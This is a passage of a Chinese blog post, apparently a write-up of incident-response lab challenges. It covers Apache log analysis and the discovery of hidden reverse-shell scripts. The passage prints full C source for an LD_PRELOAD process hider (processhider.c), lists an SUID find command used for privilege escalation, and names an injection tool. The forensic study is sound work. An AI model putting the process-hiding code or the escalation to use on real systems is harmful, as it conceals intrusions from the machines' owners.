+<p>flag1可以使用该命令直接找到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> /var/log/apache2/access.log.1 | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n</span><br></pre></td></tr></table></figure>
+<p>flag2可以根据<code>grep -Ea &quot;192.168.200.2&quot; /var/log/apache2/access.log.1</code>得到指纹信息：<code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</code> 并MD5得到</p>
+<p>flag3是查看index.php的被访问次数</p>
+<blockquote>
+<p>注意，要在grep的index.php加一个斜杠，因为可能是???index.php也被统计，而非正确的index.php</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -Ea <span class="string">&#x27;/index.php&#x27;</span> /var/log/apache2/access.log.1 | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment">#wc用于计算行数</span></span><br></pre></td></tr></table></figure>
+<p>flag4：<code>grep -Ea &quot;^192.168.200.2 - -&quot; /var/log/apache2/access.log.1 | wc -l</code></p>
+<p>flag5：<code>grep -Ea &quot;^[0-9]+.*+03/Aug/2023:[08|09]&quot; /var/log/apache2/access.log.1 | awk '&#123;print $1&#125;' | uniq -c | wc -l</code></p>
+<p>（感觉日志分析都比较固定，或许可以开发一个一把梭工具）</p>
+<h3 id="第三章-权限维持-Linux权限维持-隐藏">第三章 权限维持-Linux权限维持-隐藏</h3>
+<blockquote>
+<p>ssh <a class="link"   href="mailto:root@env.xj.edisec.net" >root@env.xj.edisec.net<i class="fas fa-external-link-alt"></i></a> -p  密码  xjqxwcyc<br>
+1.黑客隐藏的隐藏的文件 完整路径md5<br>
+2.黑客隐藏的文件反弹shell的ip+端口 {ip:port}<br>
+3.黑客提权所用的命令 完整路径的md5 flag{md5}<br>
+4.黑客尝试注入恶意代码的工具完整路径md5<br>
+5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec*** 值 作为flag提交 flag{/xxx/xxx/xxx}</p>
+</blockquote>
+<p><strong>Linux中查找所有隐藏文件和文件夹的命令</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找所有隐藏文件和文件夹</span></span><br><span class="line">find /dir -name <span class="string">&quot;.*&quot;</span> -<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找所有隐藏文件</span></span><br><span class="line">find /dir -<span class="built_in">type</span> f -name <span class="string">&quot;.*&quot;</span> -<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找所有隐藏目录</span></span><br><span class="line">find /dir -<span class="built_in">type</span> d -name <span class="string">&quot;.*&quot;</span> -<span class="built_in">print</span></span><br></pre></td></tr></table></figure>
+<p>查找所有隐藏文件后发现在<code>/tmp/.temp</code>目录似乎有些可疑</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250316232035325.png"
+                        alt="image-20250316232035325"
+                 ></p>
+<p>找到<code>1.py</code>和<code>shell.py</code>，<code>1.py</code>是一个典型的Python反弹shell，此时可以确定黑客隐藏的文件路径和反弹shell的回连地址和端口号，至于出题人要哪个ip就只能试试看了，我个人觉得两个都是吧</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250316232133414.png"
+                        alt="image-20250316232133414"
+                 ></p>
+<p><strong>解析<code>1.py</code>和<code>shell.py</code>的区别</strong></p>
+<p><code>1.py</code>作为守护进程运行，使用两次<code>os.fork()</code>使得它可以脱离原始终端控制，<code>sys.exit(0)</code> 让父进程退出，而子进程在后台运行，确保进程不会因终端关闭而结束，并且使用 <code>sys.stdout.flush()</code>、<code>sys.stderr.flush()</code> 以及 <code>sys.stdout = fdreg</code> (<code>fdreg</code> 指向 <code>/dev/null</code>)，确保输出在终端中不可见。</p>
+<p><code>shell.py</code>作为一次性shell，使用 <code>dup2(s.fileno(), 0)</code>、<code>dup2(s.fileno(), 1)</code> 和 <code>dup2(s.fileno(), 2)</code> 将标准输入、输出和错误都重定向到 <code>s</code>，然后直接执行 <code>run([&quot;/bin/bash&quot;,&quot;-i&quot;])</code> getshell。</p>
+<p><strong><code>processhider.c</code>文件解析</strong></p>
+<p>懒得写了，问问GPT吧，感觉这个东西应该可以改个通用的来隐藏进程（？</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250317001315742.png"
+                        alt="image-20250317001315742"
+                 ></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Every process with this name will be excluded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* process_to_filter = <span class="string">&quot;1.py&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a directory name given a DIR* handle</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">get_dir_name</span><span class="params">(DIR* dirp, <span class="type">char</span>* buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = dirfd(dirp);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">    <span class="type">ssize_t</span> ret = readlink(tmp, buf, size);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a process name given its pid</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">get_process_name</span><span class="params">(<span class="type">char</span>* pid, <span class="type">char</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strspn</span>(pid, <span class="string">&quot;0123456789&quot;</span>) != <span class="built_in">strlen</span>(pid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/%s/stat&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    FILE* f = fopen(tmp, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fgets(tmp, <span class="keyword">sizeof</span>(tmp), f) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fclose(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> unused;</span><br><span class="line">    <span class="built_in">sscanf</span>(tmp, <span class="string">&quot;%d (%[^)]s&quot;</span>, &amp;unused, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_READDIR(dirent, readdir)                                </span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* (*<span class="title">original_</span>##<span class="title">readdir</span>)(<span class="title">DIR</span>*) =</span> <span class="literal">NULL</span>;               </span><br><span class="line">                                                                        </span><br><span class="line"><span class="keyword">struct</span> dirent* <span class="title function_">readdir</span><span class="params">(DIR *dirp)</span>                                       </span><br><span class="line">&#123;                                                                       </span><br><span class="line">    <span class="keyword">if</span>(original_#<span class="meta">#readdir == NULL) &#123;                                    </span></span><br><span class="line">        original_#<span class="meta">#readdir = dlsym(RTLD_NEXT, #readdir);               </span></span><br><span class="line">        <span class="keyword">if</span>(original_#<span class="meta">#readdir == NULL)                                  </span></span><br><span class="line">        &#123;                                                               </span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error in dlsym: %sn&quot;</span>, dlerror());         </span><br><span class="line">        &#125;                                                               </span><br><span class="line">    &#125;                                                                   </span><br><span class="line">                                                                        </span><br><span class="line">    <span class="keyword">struct</span> dirent* dir;                                                 </span><br><span class="line">                                                                        </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)                                                            </span><br><span class="line">    &#123;                                                                   </span><br><span class="line">        dir = original_#<span class="meta">#readdir(dirp);                                 </span></span><br><span class="line">        <span class="keyword">if</span>(dir) &#123;                                                       </span><br><span class="line">            <span class="type">char</span> dir_name[<span class="number">256</span>];                                         </span><br><span class="line">            <span class="type">char</span> process_name[<span class="number">256</span>];                                     </span><br><span class="line">            <span class="keyword">if</span>(get_dir_name(dirp, dir_name, <span class="keyword">sizeof</span>(dir_name)) &amp;&amp;        </span><br><span class="line">                <span class="built_in">strcmp</span>(dir_name, <span class="string">&quot;/proc&quot;</span>) == <span class="number">0</span> &amp;&amp;                       </span><br><span class="line">                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          </span><br><span class="line">                <span class="built_in">strcmp</span>(process_name, process_to_filter) == <span class="number">0</span>) &#123;         </span><br><span class="line">                <span class="keyword">continue</span>;                                               </span><br><span class="line">            &#125;                                                           </span><br><span class="line">        &#125;                                                               </span><br><span class="line">        <span class="keyword">break</span>;                                                          </span><br><span class="line">    &#125;                                                                   </span><br><span class="line">    <span class="keyword">return</span> dir;                                                         </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECLARE_READDIR(dirent64, readdir64);</span><br><span class="line">DECLARE_READDIR(dirent, readdir);</span><br></pre></td></tr></table></figure>
+<p>Linux中常见的提权有SUID，可以直接尝试，也可以查看日志分析，可以查看<a href="https://c3ngh.top/post/suidtq/">浅析Linux SUID提权 | C3ngH’s B10g</a>这篇博客内容学习SUID提权，此处直接给出命令，一眼看出来是find命令提权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250316234106987.png"
+                        alt="image-20250316234106987"
+                 ></p>
+<p>下一步说黑客使用工具注入恶意代码，Linux系统下第三方软件通常安装在<code>/opt</code>目录下，找到一个隐藏文件，google搜到该工具：<a class="link"   target="_blank" rel="noopener" href="https://github.com/akpotter/cymothoa" >akpotter/cymothoa - Github.com<i class="fas fa-external-link-alt"></i></a></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250316234355631.png"
+                        alt="image-20250316234355631"
+                 ></p>
+<p>最后一个是用命令执行x.xx文件（<a class="link"   target="_blank" rel="noopener" href="http://xn--1-ll2b27ot1aq1iy04at36a.py" >或许指的就是1.py<i class="fas fa-external-link-alt"></i></a>？）exec命令用于<strong>替换当前进程</strong>，根据题意理解应该是要提交用于运行<code>1.py</code>的命令，其实已经写在文件最前面了，直接看到<code>#! /usr/bin/python3</code>即可</p>
+<!-- flag of hidden posts -->
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Misc/">Misc</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="waline-comment-container">
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.css"/>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline-meta.css"/>
+        <div id="waline-comment"></div>
+        <script data-pjax>
+          window.KeepCommentPlugin.walineOptions = JSON.parse('{}'.replace(/&#34;/g, '"'))
+          window.KeepCommentPlugin.walineOptions.el = '#waline-comment'
+          window.KeepCommentPlugin.walineOptions.comment = '.post-comments-count'
+          window.KeepCommentPlugin.walineOptions.serverURL = 'https://blog-waline-weld.vercel.app/'
+          window.KeepCommentPlugin.walineOptions.lang = 'zh-CN' || 'zh-CN'
+          window.KeepCommentPlugin.walineOptions.reaction = 'false' === 'true'
+        </script>
+
+        
+
+        
+            <script 
+                    async
+                    type="module"
+            >
+              import { init } from '//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.js'
+              window.KeepCommentPlugin.initWaline = () => {
+                if (init) {
+                  init(window.KeepCommentPlugin.walineOptions)
+                  window.KeepCommentPlugin.hideLoading()
+                } else {
+                  setTimeout(() => {
+                    window.KeepCommentPlugin.initWaline()
+                  }, 1000)
+                }
+              }
+
+              if ('false' === 'true') {
+                setTimeout(() => {
+                  window.KeepCommentPlugin.initWaline()
+                }, 1200)
+              } else {
+                window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initWaline)
+              }
+            </script>
+        
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80"><span class="nav-text">第一章 应急响应-webshell查杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-text">第一章 应急响应-Linux日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="nav-text">Linux日志分析技巧</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="nav-text">第一章 应急响应-Linux入侵排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-Apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-text">第二章 日志分析-Apache日志分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F"><span class="nav-text">第三章 权限维持-Linux权限维持-隐藏</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2025
+        
+            &nbsp;</i>&nbsp;&nbsp;<a href="/">C3ngH</a>
+        
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">66.5k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80"><span class="nav-text">第一章 应急响应-webshell查杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-text">第一章 应急响应-Linux日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="nav-text">Linux日志分析技巧</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="nav-text">第一章 应急响应-Linux入侵排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-Apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-text">第二章 日志分析-Apache日志分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F"><span class="nav-text">第三章 权限维持-Linux权限维持-隐藏</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
